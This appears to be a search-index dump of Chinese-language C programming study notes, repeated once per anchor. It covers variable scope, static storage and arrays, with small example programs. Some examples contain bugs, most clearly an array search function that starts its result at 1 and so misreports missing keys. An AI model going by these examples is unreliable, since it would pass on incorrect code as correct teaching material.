调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#本地变量的规则"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#当函数没有参数时"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#调用函数时的逗号"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#数字金字塔"},{"categories":["Programing"],"content":"\r7.2函数的参数和变量\r函数先后关系\r函数头中的参数是形参，调用函数时的参数是实参 函数原型\r对于函数声明，可以只写参数类型而不写参数名 函数声明既可以写在主函数里面，也可以写在主函数外面，但习惯写在主函数外面 调用函数\r传值\r本地变量​ 函数每次运行，就产生了一个独立的变量空间，在这个空间中的变量，是函数的这次运行所独有的，称作本地变量 ​ 定义在函数内部的变量就是本地变量 ​ 参数也是本地变量 全局变量和局部变量 #include int a; int main(){ int b; { int c; } return 0; } 定义在函数内部的变量为局部变量，有效作用范围局限于所在的函数内部。形参是局部变量。 全局变量定义在函数外，不属于任何函数，作用范围是从定义开始到程序所在文件的结束。 变量a为全局变量，变量b为局部变量，当遇到函数需要传多个值的时候，可以通过定义全局变量的方式进行传值. 定义在复合语句内的变量，作用范围局限在复合语句内，如变量c。 全局变量和局部变量可以重名，在出现重名的函数中，变量值采用局部变量。 局部变量都是自动变量，调用时分配内存空间，调用结束内存自动回收。 自动变量如果没有赋初值，其储存单元中将是随机值 而静态变量如果在定义时没有赋初值，系统将动赋0，而且初值只在函数第一次调用的时候起作用，以后调用都按前一次调用保留的值使用 变量的生存期、作用域什么时候这个变量出现了，到什么时候它消亡了—生存期 在代码的什么范围可以访问这个变量(变量可以起作用)—作用域 对于本地变量，这两个问题的答案是统一的：大括号内(块) 变量储存的内存分布保存所有变量的储存区分为动态储存区和静态储存区 动态储存区使用堆栈来管理，适合函数动态分配与回收储存单元 静态储存区相对固定，用于存放全局变量和静态变量 静态变量储存在静态储存区，储存单元会被保留，生存周期持续到程序结束 定义格式：static 类型名 变量表 本地变量的规则 本地变量是定义在块内的 ​ 可以是定义在函数的块内 ​ 也可以定义在语句的块内 ​ 甚至可以随便拉一对大括号来定义变量 程序运行进驻这个块之前，其中的变量不存在，离开这个块，其中的变量就消失 在块外边定义的变量，在块内仍然有效 块里面定义了和外面同名的变量，则掩盖了外面的，出来之后，其值仍然是原来在外面定义的值 在同一个块里面，不能同时定义同名的变量 本地变量不会被默认初始化 参数在进入函数时候被初始化 当函数没有参数时 void f(void); 明确声明，该函数不接受任何参数 void f(); 表示参数表位置，并不表示没有参数 当构造一个普通函数的时候，最好在括号内填入参数，若没有参数则填void 调用函数时的逗号调用函数时圆括号里的逗号是标点符号，不是运算符，例如f(a,b)，然而f((a,b))里面的逗号是运算符 数字金字塔 #include void pyramid(int n); int main(){ int n; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); pyramid(n); return 0; } void pyramid(int n){ for(int i=1;i\u003c=n;i++){ for(int j=1;j\u003c=n-i;j++){ printf(\" \"); } for(int a =1;a\u003c=i;a++){ printf(\"%d \",i); } putchar('\\n'); } } ","date":"2023-11-17","objectID":"/c_language_notes/:7:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#heading"},{"categories":["Programing"],"content":"\r8.1数组\r定义数组\u003c类型\u003e 变量名称[元素数量]; int grades[100]; double weight[20]; 元素数量必须是整数 数组名是一个地址常量，存放数组内存空间的首地址，不允许随意更改 数组是什么是一种容器 其中所有的元素具有相同的数据类型 一旦创建，不能改变大小 数组中的元素在内存中是连续一次排列的 int a[10];一个int的数组 10个单元：a[0]，b[1]，….，a[9] 每个单元就是一个int类型的变量 在赋值左边的叫做左值 数组的单元数组的每个单元就是数组类型的一个变量 使用数组时放在[]中的数字叫做下标或索引，下标从0开始计数 grades[0] 有效的下标范围编译器和运行环境不会检查数组下标是否越界，无论是对数组单元做读还是写 一旦程序运行，越界的数组访问可能造成的问题，导致系统崩溃 segmentation fault 报错可能是数组越界 数组下标的合理取值范围：[0，数组长度-1]，注意不要让下标越界 统计0-9之间的数字输入的次数 #include \u003cstdio.h\u003e int main() { int x; int count[10]; int i; //初始化数组(循环遍历数组) for (i = 0; i \u003c 10; i++) { count[i] = 0; } scanf_s(\"%d\", \u0026x); while (x != -1) { if (x \u003e= 0 \u0026\u0026 x \u003c= 9) { //数组参与运算 count[x] ++; } scanf_s(\"%d\", \u0026x); } //遍历输出数组 for (i = 0; i \u003c 10; i++) { printf(\"%d:%d\\n\", i, count[i]); } return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:8:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#81数组"},{"categories":["Programing"],"content":"\r8.1数组\r定义数组\u003c类型\u003e 变量名称[元素数量]; int grades[100]; double weight[20]; 元素数量必须是整数 数组名是一个地址常量，存放数组内存空间的首地址，不允许随意更改 数组是什么是一种容器 其中所有的元素具有相同的数据类型 一旦创建，不能改变大小 数组中的元素在内存中是连续一次排列的 int a[10];一个int的数组 10个单元：a[0]，b[1]，….，a[9] 每个单元就是一个int类型的变量 在赋值左边的叫做左值 数组的单元数组的每个单元就是数组类型的一个变量 使用数组时放在[]中的数字叫做下标或索引，下标从0开始计数 grades[0] 有效的下标范围编译器和运行环境不会检查数组下标是否越界，无论是对数组单元做读还是写 一旦程序运行，越界的数组访问可能造成的问题，导致系统崩溃 segmentation fault 报错可能是数组越界 数组下标的合理取值范围：[0，数组长度-1]，注意不要让下标越界 统计0-9之间的数字输入的次数 #include int main() { int x; int count[10]; int i; //初始化数组(循环遍历数组) for (i = 0; i \u003c 10; i++) { count[i] = 0; } scanf_s(\"%d\", \u0026x); while (x != -1) { if (x \u003e= 0 \u0026\u0026 x \u003c= 9) { //数组参与运算 count[x] ++; } scanf_s(\"%d\", \u0026x); } //遍历输出数组 for (i = 0; i \u003c 10; i++) { printf(\"%d:%d\\n\", i, count[i]); } return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:8:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#定义数组"},{"categories":["Programing"],"content":"\r8.1数组\r定义数组\u003c类型\u003e 变量名称[元素数量]; int grades[100]; double weight[20]; 元素数量必须是整数 数组名是一个地址常量，存放数组内存空间的首地址，不允许随意更改 数组是什么是一种容器 其中所有的元素具有相同的数据类型 一旦创建，不能改变大小 数组中的元素在内存中是连续一次排列的 int a[10];一个int的数组 10个单元：a[0]，b[1]，….，a[9] 每个单元就是一个int类型的变量 在赋值左边的叫做左值 数组的单元数组的每个单元就是数组类型的一个变量 使用数组时放在[]中的数字叫做下标或索引，下标从0开始计数 grades[0] 有效的下标范围编译器和运行环境不会检查数组下标是否越界，无论是对数组单元做读还是写 一旦程序运行，越界的数组访问可能造成的问题，导致系统崩溃 segmentation fault 报错可能是数组越界 数组下标的合理取值范围：[0，数组长度-1]，注意不要让下标越界 统计0-9之间的数字输入的次数 #include int main() { int x; int count[10]; int i; //初始化数组(循环遍历数组) for (i = 0; i \u003c 10; i++) { count[i] = 0; } scanf_s(\"%d\", \u0026x); while (x != -1) { if (x \u003e= 0 \u0026\u0026 x \u003c= 9) { //数组参与运算 count[x] ++; } scanf_s(\"%d\", \u0026x); } //遍历输出数组 for (i = 0; i \u003c 10; i++) { printf(\"%d:%d\\n\", i, count[i]); } return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:8:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#数组是什么"},{"categories":["Programing"],"content":"\r8.1数组\r定义数组\u003c类型\u003e 变量名称[元素数量]; int grades[100]; double weight[20]; 元素数量必须是整数 数组名是一个地址常量，存放数组内存空间的首地址，不允许随意更改 数组是什么是一种容器 其中所有的元素具有相同的数据类型 一旦创建，不能改变大小 数组中的元素在内存中是连续一次排列的 int a[10];一个int的数组 10个单元：a[0]，b[1]，….，a[9] 每个单元就是一个int类型的变量 在赋值左边的叫做左值 数组的单元数组的每个单元就是数组类型的一个变量 使用数组时放在[]中的数字叫做下标或索引，下标从0开始计数 grades[0] 有效的下标范围编译器和运行环境不会检查数组下标是否越界，无论是对数组单元做读还是写 一旦程序运行，越界的数组访问可能造成的问题，导致系统崩溃 segmentation fault 报错可能是数组越界 数组下标的合理取值范围：[0，数组长度-1]，注意不要让下标越界 统计0-9之间的数字输入的次数 #include int main() { int x; int count[10]; int i; //初始化数组(循环遍历数组) for (i = 0; i \u003c 10; i++) { count[i] = 0; } scanf_s(\"%d\", \u0026x); while (x != -1) { if (x \u003e= 0 \u0026\u0026 x \u003c= 9) { //数组参与运算 count[x] ++; } scanf_s(\"%d\", \u0026x); } //遍历输出数组 for (i = 0; i \u003c 10; i++) { printf(\"%d:%d\\n\", i, count[i]); } return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:8:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#int-a10"},{"categories":["Programing"],"content":"\r8.1数组\r定义数组\u003c类型\u003e 变量名称[元素数量]; int grades[100]; double weight[20]; 元素数量必须是整数 数组名是一个地址常量，存放数组内存空间的首地址，不允许随意更改 数组是什么是一种容器 其中所有的元素具有相同的数据类型 一旦创建，不能改变大小 数组中的元素在内存中是连续一次排列的 int a[10];一个int的数组 10个单元：a[0]，b[1]，….，a[9] 每个单元就是一个int类型的变量 在赋值左边的叫做左值 数组的单元数组的每个单元就是数组类型的一个变量 使用数组时放在[]中的数字叫做下标或索引，下标从0开始计数 grades[0] 有效的下标范围编译器和运行环境不会检查数组下标是否越界，无论是对数组单元做读还是写 一旦程序运行，越界的数组访问可能造成的问题，导致系统崩溃 segmentation fault 报错可能是数组越界 数组下标的合理取值范围：[0，数组长度-1]，注意不要让下标越界 统计0-9之间的数字输入的次数 #include int main() { int x; int count[10]; int i; //初始化数组(循环遍历数组) for (i = 0; i \u003c 10; i++) { count[i] = 0; } scanf_s(\"%d\", \u0026x); while (x != -1) { if (x \u003e= 0 \u0026\u0026 x \u003c= 9) { //数组参与运算 count[x] ++; } scanf_s(\"%d\", \u0026x); } //遍历输出数组 for (i = 0; i \u003c 10; i++) { printf(\"%d:%d\\n\", i, count[i]); } return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:8:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#数组的单元"},{"categories":["Programing"],"content":"\r8.1数组\r定义数组\u003c类型\u003e 变量名称[元素数量]; int grades[100]; double weight[20]; 元素数量必须是整数 数组名是一个地址常量，存放数组内存空间的首地址，不允许随意更改 数组是什么是一种容器 其中所有的元素具有相同的数据类型 一旦创建，不能改变大小 数组中的元素在内存中是连续一次排列的 int a[10];一个int的数组 10个单元：a[0]，b[1]，….，a[9] 每个单元就是一个int类型的变量 在赋值左边的叫做左值 数组的单元数组的每个单元就是数组类型的一个变量 使用数组时放在[]中的数字叫做下标或索引，下标从0开始计数 grades[0] 有效的下标范围编译器和运行环境不会检查数组下标是否越界，无论是对数组单元做读还是写 一旦程序运行，越界的数组访问可能造成的问题，导致系统崩溃 segmentation fault 报错可能是数组越界 数组下标的合理取值范围：[0，数组长度-1]，注意不要让下标越界 统计0-9之间的数字输入的次数 #include int main() { int x; int count[10]; int i; //初始化数组(循环遍历数组) for (i = 0; i \u003c 10; i++) { count[i] = 0; } scanf_s(\"%d\", \u0026x); while (x != -1) { if (x \u003e= 0 \u0026\u0026 x \u003c= 9) { //数组参与运算 count[x] ++; } scanf_s(\"%d\", \u0026x); } //遍历输出数组 for (i = 0; i \u003c 10; i++) { printf(\"%d:%d\\n\", i, count[i]); } return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:8:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#有效的下标范围"},{"categories":["Programing"],"content":"\r8.1数组\r定义数组\u003c类型\u003e 变量名称[元素数量]; int grades[100]; double weight[20]; 元素数量必须是整数 数组名是一个地址常量，存放数组内存空间的首地址，不允许随意更改 数组是什么是一种容器 其中所有的元素具有相同的数据类型 一旦创建，不能改变大小 数组中的元素在内存中是连续一次排列的 int a[10];一个int的数组 10个单元：a[0]，b[1]，….，a[9] 每个单元就是一个int类型的变量 在赋值左边的叫做左值 数组的单元数组的每个单元就是数组类型的一个变量 使用数组时放在[]中的数字叫做下标或索引，下标从0开始计数 grades[0] 有效的下标范围编译器和运行环境不会检查数组下标是否越界，无论是对数组单元做读还是写 一旦程序运行，越界的数组访问可能造成的问题，导致系统崩溃 segmentation fault 报错可能是数组越界 数组下标的合理取值范围：[0，数组长度-1]，注意不要让下标越界 统计0-9之间的数字输入的次数 #include int main() { int x; int count[10]; int i; //初始化数组(循环遍历数组) for (i = 0; i \u003c 10; i++) { count[i] = 0; } scanf_s(\"%d\", \u0026x); while (x != -1) { if (x \u003e= 0 \u0026\u0026 x \u003c= 9) { //数组参与运算 count[x] ++; } scanf_s(\"%d\", \u0026x); } //遍历输出数组 for (i = 0; i \u003c 10; i++) { printf(\"%d:%d\\n\", i, count[i]); } return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:8:0","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#统计0-9之间的数字输入的次数"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i\u003clength ;i++ ){ b[i] = a [i]; } 数组查找 #include \u003cstdio.h\u003e int search(int key, int a[], int length); int main() { int a[] = { 1,2,3,4,5,56,5,5,6,8 }; int x; int loc; printf(\"请输入一个数字：\"); scanf_s(\"%d\", \u0026x); loc = search(x, a, sizeof(a) / sizeof(a[0])); if (loc != -1) { printf(\"%d在第%d个位置上\\n\", x, loc+1); } else { printf(\"%%d不存在\\n\", x); return 0; } } int search(int key, int a[], int length){ int ret = 1; int i; for (i = 0; i \u003clength; i++) { if (a[i] == key) { ret = i; break; } } return ret; } 计算斐波那契数列 #include\u003cstdio.h\u003e #define MAXN 46 int main(){ int i,n; int fib[MAXN]={1,1}; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); if(n\u003e=1\u0026\u0026n\u003c=46){ for(i=2;i\u003c=n;i++){ fib[i]=fib[i-1]+fib[i-2]; } for(i=1;i\u003c=n;i++){ printf(\"%6d\",fib[i-1]); if(i%5==0){ printf(\"\\n\"); } } }else{ printf(\"Invalid Value!\\n\"); } return 0; } 查找数组中最小值及其下标 #include\u003cstdio.h\u003e #define MAXN 10 int main(){ int i,index,n; int a[MAXN]; printf(\"Enter n:\"); scanf(\"%d\",\u0026n); for(i=0;i\u003cn;i++){ scanf(\"%d\",\u0026a[i]); } index=0; for(i=1;i\u003cn;i++){ if(a[i]\u003ca[index]){ index=i; } } printf(\"min is %d \\t sub is %d\\n\",a[index],index); return 0; } 二维数组 int a[3][5]; 通常理解为a是一个3行5列的矩阵 二维数组的元素在内存存放：(按照行优先的方式存放)先存放第0行元素，再存放第1行元素…….. 二维数组遍历 for (i=0;i\u003c3;i++){ for (j=0;j\u003c5;j++){ a[i][j] = i*j; } } 二维数组的初始化 int a[][5] = { {0,1,2,3,4}, {2,3,4,5,6}, }; 列数是必须给出的，行数可以由编译器来数 每行一个{}，逗号分隔 最后的逗号可以存在 如果省略，表示补零 找出矩阵中最大值 #include\u003cstdio.h\u003e #define MAXM 6 #define MAXN 6 int main(){ int n,m,col,i,j,row; int a[MAXM][MAXN]; printf(\"Enter m,n:\"); scanf(\"%d %d\",\u0026m,\u0026n); printf(\"Enter %d characters:\\n\",m*n); for(i=0;i\u003cm;i++){ for(j=0;j\u003cn;j++){ scanf(\"%d\",\u0026a[i][j]); } } row=col=0; for(i=0;i\u003cm;i++){ for(j=0;j\u003cn;j++){ if(a[i][j]\u003ea[row][col]){ row=i; col=j; } } } printf(\"max=a[%d][%d]=%d\\n\",row,col,a[row][col]); return 0; } 判断回文 #include\u003cstdio.h\u003e #define MAXLINE 80 int main(){ int i,k; char line[MAXLINE]; printf(\"Enter a string:\"); k=0; while((line[k]=getchar())!='\\n'){ k++; } line[k]='\\0'; i=0; k=k-1; while(i\u003ck){ if(line[i]!=line[k]){ break; } i++; k--; } if(i\u003e=k){ printf(\"Palindrome\\n\"); }else{ printf(\"Not a Palindrome\\n\"); } return 0; } 以下方法更简洁 #include \u003cstdio.h\u003e int main() { int max=80; int k=0; char a[max]; scanf(\"%d\",\u0026k); while((a[k]=getchar())!='\\n'){ k++; } a[k]='\\0'; k=k-1; int i=0; while(i\u003ck){ if(a[i]!=a[k]){ printf(\"not\"); return 0; } i++; k--; } printf(\"yes\"); return 0; } ","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#82数组运算"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 数组的大小sizeof给出整个数组占据的内容的大小，单位是字节 sizeof(a)/sizeof(a[0]) sizeof(a[0])给出数组中单个元素的大小，于是相除就得到了数组的单元个数 数组的赋值数组变量本身不能被赋值 要把一个数组的所有元素交给另一个数组，必须采用遍历 遍历数组 for ( i=0 ; i","date":"2023-11-17","objectID":"/c_language_notes/:8:1","series":null,"tags":["Programing"],"title":"C语言笔记","uri":"/c_language_notes/#数组的集成初始化"},{"categories":["Programing"],"content":"\r8.2数组运算\r数组的集成初始化 int a[] = {2,3,4,45,5,6,4}; 集成初始化时的定位 int a[10] = {[0]=2, [2]=3, 6 }; 用[n]在初始化数据中给出定位 没有定位的数据在前面的位置后面 没有位置的值补零 也可以不给出数组大小，让编译器算 特别适合初始数据稀疏的数组 数组未初始化默认为0 **但要注意，**在使用前尽量将数组初始化，至少把数组第一个元素初始化，剩余元素会自动初始化为0, 一般来说，全局变量，静态变量位于数据区，默认初始化为0，局部数组根据编译器的特点有所不一样 